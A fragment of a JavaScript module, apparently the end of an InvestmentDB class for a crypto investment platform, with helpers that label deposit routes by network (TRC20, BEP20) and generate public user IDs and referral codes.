            return 'TRC20_DIRECT_TO_ADMIN';
        }
        if (network === 'bep20') {
            return 'BEP20_DIRECT_TO_ADMIN';
        }
        return 'DIRECT_TO_ADMIN';
    }

    generatePublicUserId() {
        // Public-facing account ID, not the internal database row id.
        const bytes = crypto.randomBytes(4).toString('hex').toUpperCase();
        return `NVT-${bytes.slice(0, 4)}-${bytes.slice(4, 8)}`;
    }

    generateReferralCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = 'NVT';
        for (let i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }
}

module.exports = InvestmentDB;
